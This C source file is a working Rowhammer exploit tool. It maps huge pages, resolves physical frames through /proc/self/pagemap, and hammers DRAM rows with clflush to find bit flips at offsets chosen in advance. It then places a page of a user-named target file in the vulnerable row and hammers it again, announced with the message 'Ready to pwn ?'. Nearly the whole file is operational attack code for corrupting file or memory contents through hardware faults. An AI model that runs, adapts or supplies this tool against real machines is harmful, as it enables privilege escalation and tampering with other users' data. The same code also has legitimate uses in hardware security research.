#include <err.h>
#include <fcntl.h>
#include <getopt.h>
#include <inttypes.h>
#include <limits.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <errno.h>
#include <ncurses.h>

#define PFN_PRESENT    (1ull << 63)
#define PFN_PFN        ((1ull << 55) - 1)

#define MMAP_START     0x550000000000

#define READ_REPZ      1000 * 1024
#define MAX_RUN        4

#define LOG2(n)        (31 - __builtin_clz(n))
#define HAMMER_FLAG    0x80
#define HAMMERED(buf)  (buf[0] & 0x80)
#define RANDOM_SIZE    8

#define NB_HUGE_PAGES(ctx) (ctx->target_size / ctx->huge_page_size)
#define NB_ROWS(ctx) (ctx->huge_page_size / ctx->row_size)
#define NB_PAGES(ctx) (ctx->row_size / ctx->page_size)

#define OUTPUT_HEIGHT 64
#define OUTPUT_WIDTH  64

struct unit {
	char *symbol;
	int  value;
};

/* sorted unit list */
struct unit units[] = {
	{ .symbol = " kB", .value = 10 },
	{ .symbol = "Gi", .value = 30 },
	{ .symbol = "Ki", .value = 10 },
	{ .symbol = "Mi", .value = 20 },
};

struct offset {
	size_t  offset;
	uint8_t bmask;
};

struct ctx {
	int            pagemap;
	uint64_t       target_size;
	uint64_t       page_size;
	uint64_t       huge_page_size;
	uint64_t       row_size;
	char           target[PATH_MAX];
	unsigned char  bdir;
	struct offset *offsets;
	uint16_t       offsets_size;
	unsigned char *flipmap;
	int            channels;
	int            ranks;
	int            banks;
	int            rank_bit;
	int            bank_bit;
	int            channel_bit;
};

struct result {
	uintptr_t aggressors[4];
	uint8_t *victim;
};


static int hammer_search(struct ctx *, void *, struct result *);
static int hammer_rows(struct ctx *, uint8_t *, struct result *);
static int hammer_pages(struct ctx *, uint8_t *, uint8_t *, uint8_t *, struct result *);
static void hammer_byte(uintptr_t *);
static bool is_huge_page(struct ctx *, uint8_t *);
static int check_offset(struct ctx *, uint16_t, uint8_t);
static uint64_t gva_to_gfn(struct ctx *, void *);
static uint64_t gethugepagesize(void);
static int unit_search(const void *, const void *);
static uint64_t binaryprefix2int(char *);
static void *workbench_init(struct ctx *);
static void load_offset(char *, struct ctx *);
static void ncurses_fini(struct ctx *);
static void ncurses_flip(struct ctx *, int);
static void ncurses_init(struct ctx *);
static void usage(void);
static void workbench_fini(struct ctx *, void *);

int
main(int argc, char **argv)
{
	void *buffer;
	int opt;
	int ret;
	off_t offset;
	int fd_target;
	struct result res;

	static struct option long_options[] = {
		{"help", no_argument, 0, 'h' },
		{"target", required_argument, 0, 't' },
		{"size", required_argument, 0, 's' },
		{"direction", required_argument, 0, 'd' },
		{"offset", required_argument, 0, 'o' },
		{0, 0, 0, 0 }
	};

	struct ctx ctx = {
		.target_size = (uint64_t)sysconf(_SC_PHYS_PAGES) * (uint64_t)sysconf(_SC_PAGESIZE),
		.page_size = (uint64_t)sysconf(_SC_PAGESIZE),
		.bdir = '\xff',
		.target = {'\0'},
		.offsets = NULL,
		/* memory layout dependent */
		.row_size = (1 << 18),
		.channels = 2,
		.ranks = 2,
		.banks = 8,
		.rank_bit = 6,
		.bank_bit = 14,
		.channel_bit = 17
	};

	ctx.huge_page_size = gethugepagesize();
	if (ctx.huge_page_size == 0) {
		err(EXIT_FAILURE, "cannot get huge page size");
	}

	while ((opt = getopt_long(argc, argv, "ht:s:d:o:", long_options, NULL)) >= 0) {
		switch (opt) {
			case 'h':
				usage();
				exit(EXIT_SUCCESS);
			case 't':
				if (strlcpy(ctx.target, optarg, PATH_MAX) >= PATH_MAX) {
					errx(EXIT_FAILURE, "target pathname too long");
				}
				break;
			case 's':
				ctx.target_size = binaryprefix2int(optarg);
				break;
			case 'd':
				ctx.bdir += *optarg == '0';
				break;
			case 'o':
				load_offset(optarg, &ctx);
				break;
			default:
				warnx("unknown option %c", opt);
				usage();
				exit(EXIT_FAILURE);
		}
	}

	if (optind < argc || ctx.target[0] == '\0' || ctx.offsets == NULL) {
		usage();
		exit(EXIT_FAILURE);
	}

	ctx.pagemap = open("/proc/self/pagemap", O_RDONLY);
	if (ctx.pagemap < 0) {
		err(EXIT_FAILURE, "cannot open pagemap");
	}

	buffer = workbench_init(&ctx);

	ret = hammer_search(&ctx, buffer, &res);

	if (ret != -1) {
		fd_target = open(ctx.target, O_RDONLY);
		if (fd_target < 0) {
			err(EXIT_FAILURE, "cannot open target file");
		}

		offset = (ctx.offsets[ret].offset / ctx.page_size) * ctx.page_size;
		lseek(fd_target, offset, SEEK_SET);
		read(fd_target, res.victim, ctx.page_size);

		printf("[+] Ready to pwn ?");
		getc(stdin);

		printf("[!] Hammering ...\n");
		hammer_byte(res.aggressors);
	} else {
		printf("[+] Failed to find usable bit-flip :-(\n");
	}

	free(ctx.offsets);
	workbench_fini(&ctx, buffer);
	close(ctx.pagemap);

	return 0;
}

static int
hammer_search(struct ctx *ctx, void *buffer, struct result *res)
{
	uint8_t *huge_page;
	int ret = -1;
	int h = 0, iter = 0;
	int nb_huge_page_found = 0;

	ncurses_init(ctx);

	/* Mark all pages as not yet hammered */
	for (h = 0; h < NB_HUGE_PAGES(ctx); h++) {
		huge_page = buffer + (ctx->huge_page_size * h);
		huge_page[0] &= ~HAMMER_FLAG;
	}

	while (iter < MAX_RUN  && nb_huge_page_found != NB_HUGE_PAGES(ctx)) {
		for (h = 0; h < NB_HUGE_PAGES(ctx); h++) {
			huge_page = buffer + (ctx->huge_page_size * h);
			if (!HAMMERED(huge_page) && is_huge_page(ctx, huge_page)) {
				nb_huge_page_found++;
				huge_page[0] |= HAMMER_FLAG;
				ret = hammer_rows(ctx, huge_page, res);
				if (ret != -1) return ret;
			}
			h++;
		}
		iter++;
	}

	ncurses_fini(ctx);

	return ret;
}

static int
hammer_rows(struct ctx *ctx, uint8_t *huge_page, struct result *res)
{
	int i;
	uint8_t *aggressor_row_prev, *aggressor_row_next, *victim_row;
	int ret = -1;

	for (i = 0; i < NB_ROWS(ctx) - 2 ; i++) {
		aggressor_row_prev = huge_page + (ctx->row_size * i);
		victim_row = aggressor_row_prev + ctx->row_size;
		aggressor_row_next = aggressor_row_prev + (2 * ctx->row_size);
		ret = hammer_pages(ctx, aggressor_row_prev, victim_row,
		                   aggressor_row_next, res);
		if (ret != -1) return ret;
	}
	return ret;
}

static int
hammer_pages(struct ctx *ctx, uint8_t *aggressor_row_prev, uint8_t *victim_row,
             uint8_t *aggressor_row_next, struct result *res)
{
	uintptr_t aggressor_row_1 = (uintptr_t)(aggressor_row_prev);
	uintptr_t aggressor_row_2 = (uintptr_t)(aggressor_row_next);

	uintptr_t aggressor_ch1, aggressor_ch2 , aggressor_rk1, aggressor_rk2;
	uintptr_t aggressors[4], aggressor;

	uint8_t *victim;

	uintptr_t rank, channel, bank1, bank2;

	int i, p, offset, ret = -1;

	/* Loop over every channel */
	for (channel = 0; channel < ctx->channels; channel++) {
		aggressor_ch1 = aggressor_row_1 | (channel << ctx->channel_bit);
		aggressor_ch2 = aggressor_row_2 | (channel << ctx->channel_bit);

		/* Loop over every rank */
		for (rank = 0; rank < ctx->ranks; rank++) {
			aggressor_rk1 = aggressor_ch1 | (rank << ctx->rank_bit);
			aggressor_rk2 = aggressor_ch2 | (rank << ctx->rank_bit);

			/* Loop over every bank */
			for (bank1 = 0; bank1 < ctx->banks; bank1++) {
				aggressors[0] = aggressor_rk1 | (bank1 << ctx->bank_bit);
				i = 1;
				/* Looking for the 3 possible matching banks */
				for (bank2 = 0; bank2 < ctx->banks; bank2++) {
					aggressor = aggressor_rk2 | (bank2 << ctx->bank_bit);
					/* Bank match only if 2 msb are not 0 */
					if ((((aggressors[0] ^ aggressor) >> (ctx->bank_bit + 1)) & 3) != 0)
						aggressors[i++] = aggressor;
					if (i == 4) break;
				}

				/* Ensure victim is all set to bdir */
				for (p = 0; p < NB_PAGES(ctx); p++) {
					victim = victim_row + (ctx->page_size * p);
					memset(victim + RANDOM_SIZE, ctx->bdir, ctx->page_size - RANDOM_SIZE);
				}

				hammer_byte(aggressors);

				for (p = 0; p < NB_PAGES(ctx); p++) {
					victim = victim_row + (ctx->page_size * p);

					for (offset = RANDOM_SIZE; offset < ctx->page_size; offset++) {
						if (victim[offset] != ctx->bdir) {
							if (ctx->bdir)
								victim[offset] = ~victim[offset];
							ctx->flipmap[offset] |= victim[offset];
							ncurses_flip(ctx, offset);
							if ((ret = check_offset(ctx, offset, victim[offset])) != -1) {
								ncurses_fini(ctx);
								printf("[+] Found target offset\n");
								res->victim = victim;
								for (i = 0; i < 4; i++)
									res->aggressors[i] = aggressors[i];
								return ret;
							}
						}
					}
				}
			}
		}
	}
	return ret;
}

/* double sided_hammer
 * https://github.com/vusec/hammertime
 */
static void
hammer_byte(uintptr_t aggressors[])
{
	volatile uint64_t *a = (volatile uint64_t *)aggressors[0];
	volatile uint64_t *b = (volatile uint64_t *)aggressors[1];
	volatile uint64_t *c = (volatile uint64_t *)aggressors[2];
	volatile uint64_t *d = (volatile uint64_t *)aggressors[3];

	int nb_reads = READ_REPZ;

	while (nb_reads-- > 0) {
		*a;
		*b;
		*c;
		*d;
		asm volatile (
			"clflush (%0)\n\t"
			"clflush (%1)\n\t"
			"clflush (%2)\n\t"
			"clflush (%3)\n\t"
			 :
			 : "r" (a), "r" (b), "r" (c), "r" (d)
			 : "memory"
		);
	}
}

/* convert virtual address to frame number
 * from https://github.com/nelhage/virtunoid
 */
static uint64_t
gva_to_gfn(struct ctx *ctx, void *addr)
{
	uint64_t pme, gfn;
	size_t offset;
	offset = ((uintptr_t)addr >> 9) & ~7;
	lseek(ctx->pagemap, offset, SEEK_SET);
	read(ctx->pagemap, &pme, 8);
	if (!(pme & PFN_PRESENT))
		return -1;
	gfn = pme & PFN_PFN;
	return gfn;
}

/* check if page is backed by a HUGE_PAGE */
static bool
is_huge_page(struct ctx *ctx, uint8_t *huge_page)
{
	int i;
	uint64_t gfn_0, gfn;

	gfn_0 = gva_to_gfn(ctx, huge_page);

	for (i = 1; i < NB_PAGES(ctx); i++) {
		gfn = gva_to_gfn(ctx, huge_page + (ctx->page_size * i));
		if (gfn != gfn_0 + i) return false;
	}

	return true;
}

static int
check_offset(struct ctx *ctx, uint16_t offset, uint8_t byte)
{
	int ret = -1;
	int i = 0;
	while(i < ctx->offsets_size) {
		if (ctx->offsets[i].offset % ctx->page_size == offset) {
			if (ctx->offsets[i].bmask & byte)
				return i;
		}
		i++;
	}
	return ret;
}

static void
load_offset(char *filename, struct ctx *ctx)
{
	size_t i = 0;

	FILE *f = fopen(filename, "r");
	if (!f) {
		err(EXIT_FAILURE, "cannot load offset from %s", filename);
	}

	ctx->offsets = calloc(ctx->page_size, sizeof(struct offset));
	for (i = 0; i < ctx->page_size; i++) {
		int ret;
		int offset;
		int bmask;

		ret = fscanf(f, "%x:%x", &offset, &bmask);
		if (ret == EOF) {
			break;
		}
		if (ret != 2) {
			err(EXIT_FAILURE, "invalid offset file %s", filename);
		}
		ctx->offsets[i].offset = offset;
		ctx->offsets[i].bmask = bmask;
	}
	ctx->offsets_size = i;

	fclose(f);
}

static int
unit_search(const void *k, const void *e)
{
	return strcmp(k, ((struct unit *)e)->symbol);
}

static uint64_t
binaryprefix2int(char *size)
{
	char *prefix;
	uint64_t res;
	struct unit *unit;

	res = strtoull(size, &prefix, 10);

	unit = bsearch(prefix, units, sizeof(units)/sizeof(units[0]), sizeof(struct unit), unit_search);
	if (unit == NULL) {
		errx(EXIT_FAILURE, "unknown unit %s", prefix);
	}
	return res << unit->value;
}

static uint64_t
gethugepagesize(void)
{
	FILE *meminfo;
	char *line = NULL;
	size_t size = 0;
	ssize_t length = 0;
	uint64_t ret = 0;

	meminfo = fopen("/proc/meminfo", "r");
	if (meminfo == NULL) {
		err(EXIT_FAILURE, "cannot get huge page size");
	}

	while ((length = getline(&line, &size, meminfo)) >= 0) {
		if (length < 13) {
			continue;
		}

		line[length-1] = '\0';
		if (strncmp(line, "Hugepagesize:", 12) == 0) {
			ret = binaryprefix2int(strchr(line, ' '));
			break;
		}
	}

	fclose(meminfo);

	return ret;
}

static void *
workbench_init(struct ctx *ctx)
{
	int i;
	void *buffer;

	buffer = mmap((void *)MMAP_START, ctx->target_size,
	              PROT_READ | PROT_WRITE,
	              MAP_PRIVATE | MAP_POPULATE | MAP_ANONYMOUS | MAP_FIXED,
	              -1, 0);

	if (buffer == MAP_FAILED) {
		err(EXIT_FAILURE, "mmap failed");
	}

	madvise(buffer, ctx->target_size, MADV_HUGEPAGE);

	printf("[+] Mapping buffer at %p\n", buffer);

	for (i = 0; i < (ctx->target_size / ctx->page_size); i++) {
		/* Log, but not too much */
		if (i % (int)(ctx->target_size / ctx->page_size / 100) == 0) {
			printf("\r[+] Filling %"PRIu64" bytes of memory with random: %3"PRIu64"%%",
			       ctx->target_size,
			       i * 100 / (ctx->target_size / ctx->page_size));
			fflush(stdout);
		}
		/* entropy prevents KSM from breaking THP pages */
		arc4random_buf(buffer + (ctx->page_size * i), RANDOM_SIZE);
	}
	printf("\r[+] Filling %"PRIu64" bytes of memory with random: %3"PRIu64"%%\n",
	       ctx->target_size, (uint64_t)100);

	ctx->flipmap = malloc(ctx->page_size);
	memset(ctx->flipmap, 0, ctx->page_size);

	return buffer;
}

static void
workbench_fini(struct ctx *ctx, void *buffer)
{
	munmap(buffer, ctx->target_size);
	free(ctx->flipmap);
}

static void
ncurses_init(struct ctx *ctx)
{
	int i, offset;

	initscr();
	start_color();
	init_pair(1, COLOR_GREEN, COLOR_BLACK);
	init_pair(2, COLOR_RED, COLOR_BLACK);

	int line = 0, column = 0;
	for (line = 0; line < OUTPUT_HEIGHT; line++) {
		mvprintw(line, 0, "%.04x: ", line * OUTPUT_WIDTH);
		for (column = 0; column < OUTPUT_WIDTH; column++)
			mvprintw(line, 6 + (column * 3), "00 ");
	}

	attron(COLOR_PAIR(2));
	for (i = 0; i < ctx->offsets_size; i++) {
		offset = ctx->offsets[i].offset % ctx->page_size;
		mvprintw(offset/OUTPUT_WIDTH, 6 + ((offset % OUTPUT_WIDTH) * 3), "00");
	}

	refresh();
}

static void
ncurses_flip(struct ctx *ctx, int offset)
{
	if (check_offset(ctx, offset, ctx->flipmap[offset]) != -1)
		attron(COLOR_PAIR(2));
	else
		attron(COLOR_PAIR(1));
	mvprintw(offset / OUTPUT_WIDTH, 6 + ((offset % OUTPUT_WIDTH) * 3), "%.02x", ctx->flipmap[offset]);
	refresh();
}

static void
ncurses_fini(struct ctx *ctx)
{
	endwin();
}

static void
usage(void)
{
	extern char *__progname;
	char usage[] =
		"usage: %s [-h]\n"
		"\n"
		"options:\n"
		"    -h, --help             Print this help\n"
		"    -s, --size=<size>      Set target size. <size> can be binary suffixed\n"
		"    -d, --direction=<0|1>  Set bit-flip direction 0: 0 --> 1, 1: 1 --> 0. Default to: 1 --> 0\n"
		"    -t, --target=<target>  Set target to <target> file\n"
		"    -o, --offset=<offset>  Retrieve target offsets from <offset> file\n";
	fprintf(stderr, usage, __progname);
}
